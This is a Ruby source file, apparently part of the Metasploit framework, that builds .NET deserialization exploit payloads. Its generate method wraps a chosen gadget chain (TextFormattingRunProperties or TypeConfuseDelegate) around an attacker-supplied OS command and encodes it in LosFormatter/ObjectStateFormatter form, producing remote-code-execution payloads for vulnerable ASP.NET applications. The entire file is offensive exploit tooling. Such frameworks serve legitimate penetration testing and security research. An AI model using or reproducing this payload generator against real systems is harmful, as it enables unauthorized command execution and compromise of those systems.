require 'bindata'
require 'msf/util/dot_net_deserialization/enums'
require 'msf/util/dot_net_deserialization/types'
require 'msf/util/dot_net_deserialization/gadget_chains'

module Msf
module Util

#
# Much of this code is based on the YSoSerial.Net project
# see: https://github.com/pwntester/ysoserial.net
#
module DotNetDeserialization
  DEFAULT_FORMATTER = :LosFormatter
  DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties

  def self.encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end

    encoded_int.pack('C*')
  end

  def self.get_ancestor(obj, ancestor_type, required: true)
    while ! (obj.nil? || obj.is_a?(ancestor_type))
      obj = obj.parent
    end

    raise RuntimeError, "Failed to find ancestor #{ancestor_type.name}" if obj.nil? && required

    obj
  end

  #
  # Limited Object Stream Types
  #
  class ObjectStateFormatter < BinData::Record
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
    endian                 :little
    default_parameter      marker_format: 0xff
    default_parameter      marker_version: 1
    hide                   :marker_format,  :marker_version
    uint8                  :marker_format,  :initial_value => :marker_format
    uint8                  :marker_version, :initial_value => :marker_version
    uint8                  :token
  end

  #
  # Generation Methods
  #

  # Generates a .NET deserialization payload for the specified OS command using
  # a selected gadget-chain and formatter combination.
  #
  # @param cmd [String] The OS command to execute.
  # @param gadget_chain [Symbol] The gadget chain to use for execution. This
  #   will be application specific.
  # @param formatter [Symbol] An optional formatter to use to encapsulate the
  #   gadget chain.
  # @return [String]
  def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
    serialized = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
    serialized = self.generate_formatted(serialized, formatter: formatter) unless formatter.nil?
    serialized
  end

  # Take the specified serialized blob and encapsulate it with the specified
  # formatter.
  #
  # @param formatter [Symbol] The formatter to use to encapsulate the serialized
  #   data blob.
  # @return [String]
  def self.generate_formatted(serialized, formatter: DEFAULT_FORMATTER)
    case formatter
    when :LosFormatter
      serialized = serialized.to_binary_s
      # token: Token_BinarySerialized
      formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
      formatted << encode_7bit_int(serialized.length)
      formatted << serialized
    else
      raise NotImplementedError, 'The specified formatter is not implemented'
    end

    formatted
  end

  # Generate a serialized data blob using the specified gadget chain to execute
  # the OS command. The chosen gadget chain must be compatible with the target
  # application.
  #
  # @param gadget_chain [Symbol] The gadget chain to use for execution.
  # @return [String]
  def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
    case gadget_chain
    when :TextFormattingRunProperties
      serialized = GadgetChains::TextFormattingRunProperties.generate(cmd)
    when :TypeConfuseDelegate
      serialized = GadgetChains::TypeConfuseDelegate.generate(cmd)
    else
      raise NotImplementedError, 'The specified gadget chain is not implemented'
    end

    serialized
  end
end
end
end
